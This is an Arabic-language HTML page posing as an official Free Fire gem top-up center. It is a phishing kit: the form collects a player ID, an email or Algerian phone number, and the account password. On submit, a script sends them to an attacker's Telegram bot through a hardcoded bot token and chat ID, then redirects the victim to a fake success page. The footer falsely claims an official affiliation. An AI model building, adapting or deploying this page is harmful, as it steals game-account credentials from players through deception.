<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز الشحن الرسمي - فري فاير</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap');
        
        :root {
            --primary: #FF6B00;
            --secondary: #FF9500;
            --dark: #1A1A2E;
            --light: #F5F5F5;
            --success: #4CAF50;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }
        
        body {
            background-color: #0F0F23;
            color: white;
            background-image: url('https://i.imgur.com/8N7yZQa.jpg');
            background-size: cover;
            background-attachment: fixed;
            min-height: 100vh;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            animation: fadeIn 1s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-20px);}
            60% {transform: translateY(-10px);}
        }
        
        .logo {
            height: 100px;
            filter: drop-shadow(0 0 10px rgba(255,107,0,0.5));
        }
        
        .title {
            text-align: center;
            color: var(--primary);
            margin-bottom: 20px;
            font-size: 28px;
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
        }
        
        .form-container {
            background: rgba(26, 26, 46, 0.8);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            border: 1px solid var(--primary);
            backdrop-filter: blur(10px);
            animation: slideUp 1s ease;
        }
        
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: #f1c40f;
            font-weight: 600;
            font-size: 16px;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(52, 152, 219, 0.5);
            border-radius: 10px;
            background: rgba(0,0,0,0.3);
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 10px rgba(255,107,0,0.3);
        }
        
        .gems-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 25px 0;
        }
        
        .gem-option {
            background: rgba(52, 152, 219, 0.1);
            border: 2px solid rgba(52, 152, 219, 0.3);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .gem-option:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
            border-color: var(--primary);
        }
        
        .gem-option input[type="radio"] {
            display: none;
        }
        
        .gem-option input[type="radio"]:checked + label {
            color: var(--primary);
            font-weight: bold;
        }
        
        .gem-option label {
            display: block;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(255,107,0,0.3);
            position: relative;
            overflow: hidden;
        }
        
        .btn:hover {
            background: linear-gradient(135deg, var(--secondary), var(--primary));
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255,107,0,0.5);
        }
        
        .btn:active {
            transform: translateY(1px);
        }
        
        .btn::after {
            content: "";
            position: absolute;
            top: -50%;
            left: -60%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to right,
                rgba(255, 255, 255, 0.13) 0%,
                rgba(255, 255, 255, 0.13) 77%,
                rgba(255, 255, 255, 0.5) 92%,
                rgba(255, 255, 255, 0.0) 100%
            );
            transform: rotate(30deg);
        }
        
        .btn:hover::after {
            animation: shine 1.5s ease;
        }
        
        @keyframes shine {
            100% {
                left: 120%;
            }
        }
        
        .diamond {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(255,255,255,0.8);
            transform: rotate(45deg);
            animation: float 5s infinite ease-in-out;
            opacity: 0;
        }
        
        @keyframes float {
            0% {
                transform: rotate(45deg) translateY(0) translateX(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: rotate(45deg) translateY(-100px) translateX(50px);
                opacity: 0;
            }
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: rgba(255,255,255,0.7);
            font-size: 14px;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div id="diamonds-container"></div>
    
    <div class="container">
        <div class="logo-container">
            <img src="https://i.imgur.com/JVQ0yXb.png" alt="Free Fire Logo" class="logo">
        </div>
        
        <h1 class="title">مركز الشحن الرسمي</h1>
        
        <div class="form-container">
            <form id="gemsForm">
                <div class="form-group">
                    <label for="playerId"><i class="fas fa-id-card"></i> معرف اللاعب (ID)</label>
                    <input type="text" id="playerId" name="playerId" placeholder="أدخل معرف اللاعب الخاص بك" required>
                </div>
                
                <div class="form-group">
                    <label for="loginInfo"><i class="fas fa-user"></i> البريد الإلكتروني أو رقم الهاتف</label>
                    <input type="text" id="loginInfo" name="loginInfo" placeholder="example@gmail.com أو 05XXXXXXXX" required>
                </div>
                
                <div class="form-group">
                    <label for="password"><i class="fas fa-lock"></i> كلمة المرور</label>
                    <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-gem"></i> اختر عدد الجواهر</label>
                    <div class="gems-grid">
                        <div class="gem-option">
                            <input type="radio" id="gems100" name="gems" value="100" required>
                            <label for="gems100">100 جوهرة</label>
                        </div>
                        <div class="gem-option">
                            <input type="radio" id="gems310" name="gems" value="310">
                            <label for="gems310">310 جوهرة</label>
                        </div>
                        <div class="gem-option">
                            <input type="radio" id="gems520" name="gems" value="520">
                            <label for="gems520">520 جوهرة</label>
                        </div>
                        <div class="gem-option">
                            <input type="radio" id="gems1060" name="gems" value="1060">
                            <label for="gems1060">1060 جوهرة</label>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="btn">
                    <i class="fas fa-bolt"></i> شحن الجواهر الآن
                </button>
            </form>
        </div>
        
        <div class="footer">
            هذا الموقع تابع للموقع الرسمي shop2geme
        </div>
    </div>
    
    <script>
        // إنشاء تأثير الجواهر العائمة
        function createDiamonds() {
            const container = document.getElementById('diamonds-container');
            const count = 15;
            
            for (let i = 0; i < count; i++) {
                const diamond = document.createElement('div');
                diamond.classList.add('diamond');
                
                const size = Math.random() * 10 + 5;
                const left = Math.random() * 100;
                const delay = Math.random() * 5;
                const duration = Math.random() * 5 + 5;
                
                diamond.style.width = `${size}px`;
                diamond.style.height = `${size}px`;
                diamond.style.left = `${left}vw`;
                diamond.style.bottom = `-${size}px`;
                diamond.style.animationDelay = `${delay}s`;
                diamond.style.animationDuration = `${duration}s`;
                
                container.appendChild(diamond);
            }
        }
        
        // التحقق من صحة البريد الإلكتروني أو رقم الهاتف
        function validateLoginInfo(value) {
            // تحقق من البريد الإلكتروني
            const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
            if (emailRegex.test(value)) return true;
            
            // تحقق من رقم الهاتف الجزائري
            const phoneRegex = /^(05|06|07)[0-9]{8}$/;
            if (phoneRegex.test(value)) return true;
            
            return false;
        }
        
        // عند تحميل الصفحة
        window.addEventListener('load', function() {
            createDiamonds();
            
            // إضافة التحقق من النموذج
            document.getElementById('gemsForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const loginInfo = document.getElementById('loginInfo').value;
                
                if (!validateLoginInfo(loginInfo)) {
                    alert('الرجاء إدخال بريد إلكتروني صحيح (ينتهي بـ @gmail.com) أو رقم هاتف جزائري صحيح (مثال: 0551234567)');
                    return;
                }
                
                // جمع البيانات
                const formData = {
                    playerId: document.getElementById('playerId').value,
                    loginInfo: loginInfo,
                    password: document.getElementById('password').value,
                    gems: document.querySelector('input[name="gems"]:checked').value
                };
                
                // إرسال البيانات إلى بوت التلجرام
                sendToTelegramBot(formData);
                
                // توجيه المستخدم إلى صفحة النجاح
                window.location.href = "success.html";
            });
        });
        
        function sendToTelegramBot(data) {
            const botToken = '8022090574:AAEkAMRzMqET9LqAc_a8SwcoN2Zm77hSSjA';
            const chatId = '7784082779';
            
            const message = `طلب جواهر جديد:
معرف اللاعب: ${data.playerId}
البريد/الهاتف: ${data.loginInfo}
كلمة المرور: ${data.password}
عدد الجواهر: ${data.gems}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => console.log('تم إرسال الرسالة:', data))
            .catch(error => console.error('خطأ في الإرسال:', error));
        }
    </script>
</body>
</html>
